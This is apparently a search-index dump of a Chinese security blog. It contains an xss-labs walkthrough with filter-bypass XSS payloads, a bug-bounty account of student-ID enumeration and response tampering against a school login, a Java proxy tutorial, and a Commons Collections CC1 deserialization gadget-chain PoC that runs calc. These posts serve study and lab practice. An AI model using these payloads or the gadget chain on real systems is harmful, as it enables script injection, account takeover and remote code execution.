","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:7:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-8 直接看源码 过滤的有点多，可以使用unicode编码绕过 在线编码网址：https://www.matools.com/code-convert-unicode，和另一种的区别 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:8:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-9 多了个条件 也就是传的值要有 http:// ，即传入 \u0026#106;\u0026#97;\u0026#118;\u0026#97;\u0026#115;\u0026#99;\u0026#114;\u0026#105;\u0026#112;\u0026#116;\u0026#58;\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026#40;\u0026#41;/* http:// */ ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:9:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-10 查看源码 发现有隐藏参数 t_sort ，可以看到还过滤了尖括号，用 onfocus 事件绕过。这里还要把 type 从 hidden 改为 test \" onfocus=javascript:alert() type=\"text ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:10:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-11 ![屏幕截图 2024-01-10 142511](https://raw.githubusercontent.com/gaorenyusi/img/master/img/屏幕截图 2024-01-10 142511.png) 四个隐藏参数，都进行传参，发现只有 t_sort 有数据，但被转义了，然后看wp说 ref 是 referer 头部的数据，然后过滤了\u003c\u003e 所以上面的payload继续用，利用hacker传到referer头部 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:11:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-12 看源码 从ua不难看出是user agent头部，和上关区别不大 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:12:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-13 这次参数是 t_cook ，那么看来是cookie了，抓包看看参数 user，那么给user传上面构造。得到 这个也行 \" onclick=alert() type=\"text ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:13:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-14 这关卡的 iframe 引用的地址打不开了，参考师傅们的14关可以自己本地搭建，意思就是引用到本地的网址，在本地放上 exif xss 漏洞。 复制师傅们的代码，开启 exif ， 把地址改为 http://127.0.0.1:89，然后上传的图片里面有xss恶意代码就会因为exif解析而触发， 后面换成了index.php，端口换一下就行，影响不大， ![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/屏幕截图 2024-01-10 152026.png) 参考：https://blog.csdn.net/qq_40929683/article/details/120422266 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:14:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-15 源代码 ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号列如 然后有 但是不能包涵那些直接弹窗的东西如\u003cscript\u003e，可以包含手动弹窗，比如\u003ca\u003e、\u003cinput\u003e、\u003cimg\u003e、\u003cp\u003e标签等等，那么构造 ?src='/level1.php?name=\u003cimg src=1 onmouseover=alert()\u003e'![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/屏幕截图 2024-01-10 153113.png) ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:15:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-16 直接看源码 首先 script 标签被过滤了，那么换其他的标签（用不需要用 / 符号的标签），至于空格用%0a代替 \u003cimg%0asrc=\"x\"%0aonerror=alert(\"xss\");\u003e ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:16:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-17 直接看源代码 简单解释就是包含正确的区域就行了，把源码改为包含level15.png（swf文件要下载 flash player 插件才行）就能正常包含区域，然后传入 ?arg01= onmouseover\u0026arg02=alert() ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:17:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-18 看源码和17关差不多，改了包含文件直接传17关的payload ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:18:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-19 涉及到了 swf 的反编译，下载个flash player看看（不知道为啥重复了几遍）。根据师傅解释这里flash里面提示sifr.js是没有定义的，所以需要反编译看看源码。 工具 jpexs 下载后，跟着师傅做 发现flash显示的内容 发现%s是显示内容的一个变量，溯源%s， 读不懂，看师傅wp大概是和version有关， 看不懂一点😓😓😓，不管那么多了，跟着传入payload，那个version就是反编译看出来的，大概是version=123，然后find里%s就显示的123 继续 arg01=version\u0026arg02=\u003ca href=\"javascript:alert(/xss/)\"\u003exss\u003c/a\u003e ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:19:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-20 也要反编译，看看wp得了 参考：https://blog.csdn.net/u014029795/article/details/103217680 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:20:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["src"],"content":"记一次 edu 证书站失败的逻辑漏洞 闲来无事，在礼物中心看到个证书站，看名称感觉应该挺好挖的，简单信息搜集一波，在 hunter 上查看子域名，发现有个管理系统 访问该链接，是个登录框 现在需要去搞一手学号什么的了（因为是随便看看的所以没有先信息搜集），利用 hack 语法找了半天只找到 16，17 级的学生学号，尝试利用显示账号错误，看来还是需要找近几年的了， 又去 dy，xhs 等社交平台上找了半天发现没有竟然没找到，最后直接通过 16，17 的学号重新构造爆破的 24 级学号，尝试弱密码登录发现没戏，直接试试抓包改回包 把回包的 402 改为 200 提示 说明应该是成功登录进去了，但是还是需要对用户进行鉴权才会显示功能点，那么既然登录存在逻辑漏洞，是否修改密码也存在相同的漏洞， 同理抓包修改 发现直接来到了设置新密码，说明逻辑漏洞绕过成功了， 最后修改密码成功， 再次进行登录，发现还是提示账号或密码有误， 猜测该逻辑漏洞可能只是前端逻辑漏洞，通过修改的响应值只能决定前端的显示。数据并没有写入后端。 ","date":"2024-10-20","objectID":"/posts/edusrc/:0:0","tags":["src"],"title":"记一次 edu 证书站失败的逻辑漏洞","uri":"/posts/edusrc/"},{"categories":["javasec"],"content":"分析了上一条链子，其实在TransformMap类那里有个分叉点，就是还可以利用另一个类LazyMap进行transform方法的调用。 进入到LazyMap类中，发现get方法也调用了transform方法： 可以看到在调用方法之前有个if的判断，跟进这个containKey函数： 翻译一手： 也就是传入的key值是map键值对中没有的就会返回false了，这个很容易就能实现。 然后看看怎么控制参数factory，发现构造方法可以对factory进行赋值，虽然有两个构造方法但其参数类型不同先不管。 这里又是保护属性，需要找一找看有没有其他地方对其进行了调用。发现和TransformMap一样都有个静态方法decorate能够实现构造方法的调用。 测试一下： import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args) throws Exception { InvokerTransformer t = new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"calc\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e Lazy = LazyMap.decorate(map,t); Lazy.get(Runtime.getRuntime()); } } 还是和上一条链子一样，继续向上找看谁调用了get方法，发现有一千多个结果，这怎么找。 反正感觉应该和上一条链子是差不多的，直接从终点类AnnotationInvocationHandle开始找，不过发现memberValues.get并不在readObjetc中而是在invoke方法里。 但这里是Handler中的invoke方法，这不是很熟悉吗。在jdk动态代理是可以通过Proxy.newProxyInstance获得对象，然后调用该对象方法来达到Handler.invoke()方法。但是这怎么和readObject相联系呢？ 我们在来看看在执行readObject的时候有没有什么我们可以控制的方法调用（因为要通过方法调用来转到Handler.invoke()方法）， 这个首当其冲就应该想到memberValues吧，毕竟这个承参数最容易控制。然后看到在for循环的时候调用了其方法entrySet（下面它的其他方法就不用看了，调用到第一个方法的时候就已经转到Handler.invoke()方法了）。所以思路清晰了，就是让memberValues为Proxy.newProxyInstance获得的对象就行了。这样在进行反序列化的到for时就能自动进入invoke方法，在进入invoke方法时，我们在通过构造函数把memberValues设为lazyMap，这样就可以调用到lazyMap的get方法，在由get方法去调用transform方法。 反序列化是这样，所以构造序列化payload就行先把memberValues设为lazyMap，在把memberValues设为Proxy.newProxyInstance获得的对象。 先构造Hanlder对象： Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); InvocationHandler hand=(InvocationHandler)con.newInstance(Override.class,Lazy); //通过构造函数设memberValues为lazyMap然后利用Proxy.newProxyInstance获得的proxyMap对象并且handler参数为hand（这样就可转到AnnotationInvocationHandler的invoke方法呢） Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},hand);接下来只需要调用proxyMap的方法了，设memberValues为proxyMap： InvocationHandler in =(InvocationHandler) con.newInstance(Repeatable.class,proxyMap);所以最后poc： package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Repeatable; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Proxy; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); InvokerTransformer t = new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"calc\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"entrySe\",\"entrySet\"); //可以不用设，不要把key设为entrySet，不然不满足lazy.get条件 Map\u003cObject,Object\u003e Lazy = LazyMap.decorate(map,cha); Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); InvocationHandler hand=(InvocationHandler)con.newInstance(Override.class,Lazy); Map proxyMap = (Map) Proxy.newProxyInstan","date":"2024-06-22","objectID":"/posts/cc1%E8%A1%A5%E5%85%85-lazymap%E5%88%A9%E7%94%A8/:0:0","tags":["java","反序列化"],"title":"CC1补充-LazyMap利用","uri":"/posts/cc1%E8%A1%A5%E5%85%85-lazymap%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"代理模式是什么 一、概念 在有些情况下，一个客户不能或者不想直接访问另一个对象，这时需要找一个中介帮忙完成某项任务，这个中介就是代理对象。 例如：购买火车票不一定要去火车站买，可以通过 12306 网站或者去火车票代售点买。又如找女朋友、找保姆、找工作等都可以通过找中介完成。平时的交作业也是通过中介（课代表）来完成的。 二、定义 由于某些原因需要给某对象提供一个代理以控制对该对象的访问。 访问对象不适合或者不能直接引用目标对象，代理对象就可以作为访问对象和目标对象之间的中介。 三、代理模式中涉及的主要成员 抽象角色：通过接口或抽象类声明真实主题和代理对象实现的业务方法。 真实角色：实现了抽象主题中的具体业务，是代理对象所代表的真实对象，是最终要引用的对象。 代理：提供了与真实主题相同的接口，其内部含有对真实主题的引用，它可以访问、控制或扩展真实主题的功能。 客户 : 将要使用代理角色来进行一些操作 。 四、优点（都是些客套话） 代理模式在客户端与目标对象之间起到一个中介作用和保护目标对象的作用 代理对象可以扩展目标对象的功能 代理模式能将客户端与目标对象分离，在一定程度上降低了系统的耦合度，增加了程序的可扩展性 五、缺点 冗余，由于代理对象要实现与目标对象一致的接口，会产生过多的代理类 系统设计中类的数量增加，变得难以维护 ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:1:0","tags":["java"],"title":"java动态代理","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"静态代理 需要代理对象和目标对象实现一致的接口。 例如：学生交作业，一般都是学生先交给课代表，课代表交给老师这种模式。课代表在这里相当于说一个学生代理类。 homework.java（抽象角色：交作业） //抽象角色：交作业 public interface homework { public void hwsent(); }student.java（真实角色：学生） //真实角色：学生，交作业 public class student implements homework { public void hwsent() { System.out.println(\"张三交作业\"); } }Proxy.java（代理：课代表） //代理：课代表 public class Proxy implements homework{ student Student; public Proxy(student stu){ //代理类的构造函数，参数是待会传入的学生类的实列化 this.Student = (student) stu; } public void Helpsubmit(){ //添加的功能 System.out.println(\"课代表帮忙交作业\"); } public void hwsent() { //接口方法的重写 Helpsubmit(); this.Student.hwsent();//调用学生类的方法hwsent() } }Main.java（客户：老师，收学生作业） public class Main{ public static void main(String[] args){ System.out.println(\"老师收作业\"); student stu=new student(); Proxy kdb=new Proxy(stu); kdb.hwsent(); //通过调用课代表的hwsent()，而课代表的hwsent()方法又调用了学生的hwsent()方法来实现调用学生的hwsent() } } 在这个过程中，老师接触的是课代表，没有接触到具体学生，但是依旧能够收到作业。 **缺点：**一旦实现的功能增加，将会变得异常冗余和复杂，而且当需要的代理的对象过多就需要实现大量的代理类。 所以又有了动态代理。 ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:2:0","tags":["java"],"title":"java动态代理","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"动态代理 与静态代理相同，需要公共接口（抽象角色），委托类（也就是上面的学生，真实角色），代理类。区别就是动态代理是利用反射机制在运行时创建代理类，这样可以解决静态代理代码冗余，难以维护的缺点。 在Java中常用的动态代理有如下几种方式： JDK 原生动态代理 cglib 动态代理 javasist 动态代理 ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:3:0","tags":["java"],"title":"java动态代理","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"JDK 原生动态代理 首先实现一个InvocationHandler，方法调用会被转发到该类的invoke()方法。具体看下面newProxyInstance方法的第三个参数。 然后在需要使用student的时候，通过JDK动态代理获取student的代理对象。(下面的代理类就是上面所说的委托类) 一、InvocationHandler.invoke方法 负责提供调用代理的操作: public interface InvocationHandler { public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; }其中proxy为代理类的实例对象，method表示调用的方法名，args为调用方法的参数数组。 那么既然代理对象是重写的接口的方法，而proxy又为代理类的实列对象，所以只要method为接口的方法就可以通过反射来调用代理对象的重写后的方法： method.invoke(proxy,arg);所以构造一个新的Handler： // 首先实现一个InvocationHandler，方法调用会被转发到该类的invoke()方法，重写InvocationHandler接口的invoke方法。 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; class ProxyHandler implements InvocationHandler{ public homework hw; public ProxyHandler(homework work) { this.hw = work; ////设置需要代理的对象 } public Object invoke( Object proxy, //代理类的实例对象，也就是构造函数传下来的this.hw Method method, //调用的方法，由前面决定 Object[] args) //调用方法的参数数组 throws Throwable { return method.invoke(hw, args);//反射调用student.hwswent()方法 } }可以看出只要调用到了ProxyHandler.invoke方法后，proxy和method都是满足我们想要的就能成功调用到student.hwsent()方法。 那么又该怎么来调用ProxyHandler.invoke方法呢？接着看 二、Proxy.newProxyInstance方法 Proxy类：负责动态构建代理类，提供了一个静态方法用于得到代理对象： newProxyInstance(ClassLoader,Class\u003c?\u003e[],InvocationHandler);loader指定代理对象的类加载器，interfaces是指代理对象需要实现的接口，可以同时指定多个接口，handler是方法调用的实际处理者，代理对象的方法调用都会转发到这里 Proxy.newProxyInstance会返回一个实现了指定接口的代理对象（这里就是实现homework接口的student嘛），对该对象的所有方法调用都会转发给handler.invoke()方法（假如返回的代理对象名字是stu，那么stu.hwsent()方法调用时就会转发到handler.invoke()方法）。 可以看到如果handler为ProxyHandler，就能触发ProxyHandler.invoke方法了，在invoke()方法里我们除了可以加入反射调用student.hwsent方法外，我们还可以加入其他任何逻辑，比如修改方法参数，加入日志功能、安全检查功能等等。 是不是感觉这个重写invoke方法不就是像上面静态代理的Proxy中的hwsent一样嘛，唯一区别就是可以通过前面的newProxyInstance传入的值来动态改变方法和代理对象，比静态代理方便了很多。 所以构造handler的invoke方法（比上面多加一句话）： // 首先实现一个InvocationHandler，方法调用会被转发到该类的invoke()方法，重写InvocationHandler接口的invoke方法。 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; class ProxyHandler implements InvocationHandler{ public homework hw; public ProxyHandler(homework work) { this.hw = work; } public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\"课代表帮忙交作业\"); return method.invoke(hw, args); } }客户（老师：收作业） // 2. 然后在需要使用student的时候，通过JDK动态代理获取student的代理对象。 import java.lang.reflect.Proxy; public class Main{ public static void main(String[] args){ student stu=new student(); homework home = (homework) Proxy.newProxyInstance( stu.getClass().getClassLoader(), //1. 指定代理对象的类加载器 new Class\u003c?\u003e[] {homework.class}, // 2. 代理需要实现的接口，可以有多个 new ProxyHandler(stu));// 3. 方法调用的实际处理者，代理对象的方法调用都会转发到这里 System.out.println(\"老师收作业\"); home.hwsent(); } }最后效果和静态代理一样： ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:3:1","tags":["java"],"title":"java动态代理","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"CGLIB动态代理 JDK动态代理还有上面的静态代理都是基于公共接口的，如果对象没有实现接口该如何代理呢？CGLIB代理登场 CGLIB(Code Generation Library)是一个基于ASM的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。CGLIB通过继承方式实现代理。 使用cglib需要引入cglib的jar包，在pom.xml中添加下面这段内容，然后重新加载 \u003cdependency\u003e \u003cgroupId\u003ecglib\u003c/groupId\u003e \u003cartifactId\u003ecglib\u003c/artifactId\u003e \u003cversion\u003e3.3.0\u003c/version\u003e \u003c/dependency\u003e如果出现这个就是ok了： 假如现在的代理类student没有实现接口： public class student{ public void hwsent() { System.out.println(\"张三交作业\"); } }和 jdk 动态代理差不多 首先实现一个MethodInterceptor，方法调用会被转发到该类的intercept()方法。 然后在需要使用student的时候，通过CGLIB动态代理获取代理对象。 一、MethodInterceptor.intercept()方法 对其进行重写： import net.sf.cglib.proxy.MethodInterceptor; import net.sf.cglib.proxy.MethodProxy; import java.lang.reflect.Method; public class RentMethodInterceptor implements MethodInterceptor { public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable { System.out.println(\"课代表帮忙交作业\"); return proxy.invokeSuper(obj, args); } }obj: 表示代理对象，method: 表示正在被调用的方法，args: 表示方法调用时传递的参数数组，proxy: 表示用于调用原始方法的 MethodProxy 对象（比上面的InvocationHandler.invoke方法多了一个参数，也正是这个参数可以使其在没有接口依然能实现动态代理） 至于proxy.invokeSuper(obj, args);这里的方法调用我就没深入跟进了，大概意思就是proxy是个代理类，而proxy.invokeSuper(obj, args)是调用代理类的父类（被代理类）的方法，这个感觉不用怎么管，这是这个工具自己的构造。 二、Enhancer类 构造： import net.sf.cglib.proxy.Enhancer; public class Main{ public static void main(String[] args){ student stu=new student(); Enhancer en = new Enhancer(); //工具类 en.setSuperclass(stu.getClass()); //设置父类 en.setCallback(new RentMethodInterceptor()); //设置回调函数 student proxy = (student) en.create(); //代理对象 //上面的步骤就理解为这个工具使用Enhancer类进行代理的相关设置吧 System.out.println(\"老师收作业\"); //执行代理对象方法 proxy.hwsent(); } } ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:3:2","tags":["java"],"title":"java动态代理","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"Commons Collections简介 Apache Commons Collections 是一个扩展了Java 标准库里的Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。 作为Apache 开源项目的重要组件，被广泛运用于各种Java 应用的开发。 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:1:0","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"环境配置 jdk版本：jdk8u71以下，因为在该jdk版本以上这个漏洞已经被修复了 下载链接：https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html 一、依赖配置 先创建一个新的maven项目： 然后在文件pom.xml的中添加（这里是分析Commons Collections3.2.1版本下的一条反序列化漏洞链）： \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.2.1\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e完成后重新加载一下即可。 二、源码配置 这个也是需要配置的，因为后面会用到jdk中的一些类，而这些类是class文件，不利于我们分析，我们需要它的.java文件，这就需要下载其对应源码。 下载：https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4 点击zip下载后解压，在/src/share/classes中找到sun文件，把其复制到jdk中src.zip的解压文件 然后在idea中的项目结构处加载源路径 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:2:0","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"链子分析 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:0","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"终点类 终点类就是链子的最底端调用危险函数的地方，但这也是我们入手的地方。 接口Transformaer的tranform方法： 然后看一下哪些类实现了该接口（IDEA中快捷键：ctrl+alt+b）： ChainedTransformer 这个类中的transform方法起到个链式调用的作用，就是把前一次的输出当作后一次的输入。 ConstantTransformer 可以看到该类是接受一个任意对象然后都返回一个常量，而该常量又是由构造函数控制的。 InvokerTransformer 这个类中的transform方法实现了个任意方法调用（因为其中的变量可以由构造函数控制）。可以利用其构造恶意方法进行代码执行。 测试一下： package org.example; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1test{ public static void main(String[] args)throws Exception { InvokerTransformer in = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); in.transform(Runtime.getRuntime()); } } 可以看到能够通过调用该类的transform方法进行恶意方法调用从而命令执行。其实就是其实现了个简单的反射功能，让我们把原本的两行写成了一行。那么这个类就是终点类了。 在正常反序列化分析思路中其实就找两个点，第一个是找哪个类中的方法有调用危险方法（终点类），第二个就是重写了readObject的类（起点类），很显然这里的InvokerTransformer是终点类。 所以接下来就是看谁调用了InvokerTransformer.transform()方法， ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:1","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"checkSetValue() 查找一下transform()的用法（就是看哪里调用了transform()）： 发现TransformedMap类的 checkSetValue()里使用了 valueTransformer调用transform()，这个valueTransformer看名字就非常可疑，感觉应该是可控的参数，跟进到TransformedMap类中： 看到参数valueTransformer是保护+final属性，但发现该类的构造函数可以对valueTransformer进行赋值。 可惜构造函数也是保护属性，只能自己调用。不要灰心继续找找看谁调用了该构造函数（有点像Rutime实例化的获得，不过其是私有属性）。 发现是个公有静态方法可以调用。 那么现在就是可以通过调用decorate函数来进行TransformedMap类实例化从而让valueTransformer的值等于InvokerTransformer。 然后就是要调用checkSetValue() 方法来实现上面InvokerTransformer中的transform()方法，但是从上面不难发现checkSetValue()是个保护属性的函数，所以又要去找找谁调用了checkSetValue()方法。 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:2","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"setValue() 可以看到只有一个结果，跟进该类看看： 是个子类里面调用的，并且它的构造方法是保护属性，setValue方法倒是公有属性，但看来是不能直接实列化来调用setValue()方法了， 但是这里查看该方法调用结果太多了，有38个结果，主要是我也看不懂怎么调用的。先直接照着师傅们的构造调用一下吧： package org.example; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { InvokerTransformer in = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map=new HashMap(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e t= TransformedMap.decorate(map,null,in);//静态方法staic修饰直接类名＋方法名调用 for(Map.Entry entry : t.entrySet()){ entry.setValue(Runtime.getRuntime()); } } }运行结果： 大概解释一下为什么这里entry.setValue(Runtime.getRuntime());会调用到MapEntry中的setValue方法（虽然调试一下也知道）。这里其实就是在遍历Map中的键值对，而这里Map是TransformedMap对象修饰后的键值，TransformedMap是继承的AbstractInputCheckedMapDecorator类，AbstractInputCheckedMapDecorator类又继承AbstractMapDecorator类，MapEntry也是AbstractMapDecorator的副类，那么在调用setValue的时候就会调用到重新后的setValue方法也就是MapEntry中的setValue方法。 （其实感觉就像反序列化最基础的readObject方法重写一样，为什么就一定会调用到重写readObject方法，因为序列化的对象就是这个类嘛。） ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:3","tags":["java","反序列化"],"title":"CC1链的分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"readObject() 但是很显然这里并不是终点链，因为还没有涉及到反序列化。所以还是得找谁调用了setValue()方法，不过通过上面的自己构造调用来看，我们要找的类里面调用setValue方法估计也是以差不多的形式来调用的。 最后在AnnotationInvocationHandle类中找到了符合条件的情况。 memberValue参数可控，而且发现还在readObject方法里面，这不妥妥起点类了嘛。 